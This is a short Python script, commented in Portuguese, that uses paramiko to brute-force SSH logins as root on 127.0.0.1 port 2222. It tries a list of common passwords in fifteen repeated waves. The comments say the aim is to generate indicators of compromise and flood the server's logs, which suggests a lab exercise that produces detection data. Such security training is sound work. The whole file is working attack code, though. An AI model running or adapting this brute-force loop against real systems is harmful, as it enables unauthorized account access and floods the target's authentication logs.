import paramiko
import time

def ataque_forca_bruta():
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Expandimos o dicionário para gerar mais ruído (IoCs)
    senhas_comuns = ['123456', 'admin', 'password', 'qwerty', '123456789', 'teste', 'senha', 'toor', 'root', 'root123']
    
    for senha in senhas_comuns:
        try:
            # Tenta conectar como root forçando erros propositais
            cliente.connect('127.0.0.1', port=2222, username='root', password=senha, timeout=3)
            print(f"[+] SUCESSO! Senha conectada com: {senha}")
            cliente.close()
            # Removido o 'break' para o ataque continuar floodando o servidor
        except paramiko.AuthenticationException:
            print(f"[-] Falha ao tentar a senha: {senha}")
        except Exception as e:
            print(f"[-] Erro de rede: {e}")
        time.sleep(1) # Intervalo curto para floodar o log

if __name__ == "__main__":
    print("[!] Iniciando ataque contínuo de Força Bruta...")
    # Criamos um loop de 15 "ondas" de ataque para durar o mesmo tempo do acesso legítimo
    for onda in range(15):
        print(f"\n--- Iniciando onda de ataque {onda + 1}/15 ---")
        ataque_forca_bruta()
        time.sleep(2)